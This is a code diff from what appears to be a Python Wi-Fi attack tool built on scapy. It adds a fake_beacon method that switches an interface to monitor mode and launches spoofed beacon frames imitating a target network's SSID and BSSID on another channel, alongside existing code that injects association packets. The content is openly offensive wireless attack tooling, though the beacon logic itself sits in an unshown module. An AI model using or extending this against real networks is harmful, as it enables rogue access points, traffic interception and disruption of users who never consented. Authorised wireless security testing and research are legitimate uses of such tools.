@@ -5,6 +5,7 @@ import keyboard
 from scapy.volatile import RandMAC
 
 import Drawer
+from Sniffer_dir.FakeBeacon import FakeBeaconAttacker
 from Sniffer_dir.common import bash
 from Sniffer_dir.common import *
 from Sniffer_dir.constants import *
@@ -151,6 +152,15 @@ class attacker:
                              / Dot11Elt(ID=0, info="{}".format(args[i]["SSID"]))
                     quantity = 3
                     sendp(assoc_packet, iface=self.attack_int, count=quantity, verbose=0)
+
+    def fake_beacon(self, args: dict):
+        self.attack_int = self.__start_monitor_mode(self.attack_int)
+
+        attacker_obj = FakeBeaconAttacker(ssid=args["SSID"], bssid=args["BSSID"], exclude_channel=int(args["Channel"]),
+                                          interface=self.attack_int, frequency=float(args["Freq"]))
+        attacker_obj.launch()
+
+
     def __GetInterfaces(self):
         retval = []
         p = Path(INTERFACESPATH)
